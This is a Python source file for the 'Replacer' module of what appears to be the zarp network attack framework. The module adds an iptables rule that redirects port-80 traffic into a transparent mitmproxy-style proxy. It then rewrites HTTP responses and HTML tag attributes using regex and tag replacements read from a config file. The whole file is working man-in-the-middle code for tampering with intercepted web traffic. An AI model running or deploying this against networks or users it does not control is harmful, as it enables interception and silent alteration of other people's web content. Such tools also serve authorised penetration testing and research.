from attack import Attack
from libmproxy import controller, proxy, platform
from zoption import Zoption
from threading import Thread
from os import getcwd
from HTMLParser import HTMLParser
import re
import util

class replacer(Attack):
    def __init__(self):
        super(replacer, self).__init__("Replacer")
        self.replace_regex = {}           # structure of {'match':'replace'}
        self.replace_tags = {}
        self.hooker = None
        self.proxy_server = None
        self.iptable = "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 5544"
        self.config.update({"replace_file":Zoption(type="file",
                                                   value = getcwd() + '/config/replacements',
                                                   required = True,
                                                   display = "File containing replace matches")
                           })
        self.info = """
                    Replacer is an HTTP find and replace module.  All HTTP traffic
                    accessible by zarp may be modified. 

                    This will load the defined file, parse it, and listen for all traffic 
                    on the local interface.  Content-Length header is automatically updated,
                    and the find/replace matches affect both the body and the headers.  Review
                    the config file at config/replacements for information regarding formatting.
                    """

    def modip(self, enable=True):
        """ Enable or disable the iptable rule
        """
        if enable:
            util.init_app(self.iptable)
        else:
            util.init_app(self.iptable.replace('-A', '-D'))

    def initialize(self):
        self.load_file()
        if (len(self.replace_regex) + len(self.replace_tags)) <= 0:
            util.Error("No matches loaded.")
            return False

        self.modip()

        self.running = True
        config = proxy.ProxyConfig(transparent_proxy = dict(
                                    resolver = platform.resolver(),
                                    sslports = [443])
                                   )

        config.skip_cert_cleanup = True
        self.proxy_server = proxy.ProxyServer(config, 5544)
        self.hooker = Hooker(self.proxy_server, self.replace_regex,
                             self.replace_tags)

        util.Msg("Launching replacer...")
        thread = Thread(target=self.hooker.run)
        thread.start()

        return True

    def shutdown(self):
        util.Msg("Shutting down replacer...")
        self.modip(False)
        self.proxy_server.shutdown()
        self.hooker.shutdown()

    def load_file(self):
        """ Load the defined file and attempt to build the struct
        """
        with open(self.config['replace_file'].value, 'r') as f:
            lines = f.readlines()
            for line in lines:
                if (len(line) > 0 and line[0] == '#') or len(line) <= 2:
                    continue

                cut = line.split(" = ")
                if len(cut) < 2 or len(cut) > 2:
                    util.Error("Incorrect formatting for line '%s'" % cut)
                else:
                    try:
                        if cut[0][0] == '1':
                            # this is a regex entry, parse and try to compile it
                            tmp = re.compile(cut[0][2:])
                            self.replace_regex[cut[0][2:]] = cut[1].rstrip('\n')
                        elif cut[0][0] == '2':
                            #
                            # this is a tag, split it out and build a dictionary.
                            # The dictionary is essentially:
                            #               {'outer' : {'attribute' : 'replacement'}}
                            # Each outer tag may have multiple attributes for 
                            # replacement.
                            #
                            tags = cut[0][2:].split(' ')

                            if tags[0] in self.replace_tags:
                                self.replace_tags[tags[0]][tags[1]] = cut[1].rstrip('\n')
                            else:
                                self.replace_tags[tags[0]] = {}
                                self.replace_tags[tags[0]][tags[1]] = cut[1].rstrip('\n')
                    except:
                        util.Error("Incorrect regex: '%s'" % cut[0][2:])
        util.Msg("Loaded %s matches" % (len(self.replace_regex) + len(self.replace_tags)))
        return True
    
    def session_view(self):
        """ Return the number of loaded matches
        """
        return "%d regex values loaded." % (len(self.replace_regex) + len(self.replace_tags))

class HTMLHooker(HTMLParser):
    """ Parsing and modifying HTML is much easier with the HTMLParser.
        This handles parsing tags.
    """
    def __init__(self, match):
        HTMLParser.__init__(self)
        self.match = match
        self.data = {}

    def handle_starttag(self, tag, attrs):
        for key in self.match.keys():
            if key == tag:
                for itag in self.match[key].keys():
                    # iterate through attribute tags to see if any match
                    for tag_atts in attrs:
                        if tag_atts[0] == itag:
                            if itag not in self.data.keys():
                                self.data[itag] = []
                            if tag_atts[1] not in self.data[itag]:
                                self.data[itag].append(tag_atts[1])
                            break
                   
class Hooker(controller.Master):
    """ Listens for and parses HTTP traffic
    """
    def __init__(self, server, rep_regex, rep_tags):
        controller.Master.__init__(self, server)
        self.rep_regex = rep_regex
        self.rep_tags = rep_tags

    def run(self):
        try:
            return controller.Master.run(self)
        except:
            self.shutdown()

    def handle_response(self, msg):
        """ Iterate through the response and replace values
        """
        for match in self.rep_regex:
            msg.replace(match, self.rep_regex[match])
       
        # modify the DOM
        try:
            for tag in self.rep_tags.keys():
                tmp = {}
                tmp[tag] = self.rep_tags[tag]
                parser = HTMLHooker(tmp)
                parser.feed(msg.get_decoded_content())
                for entry in parser.data.keys():
                    for data_entry in parser.data[entry]:
                        rep_entry = self.rep_tags[tag][entry]
                        msg.replace(data_entry, rep_entry)
        except Exception, e:
            util.debug(e) 
        msg.reply()
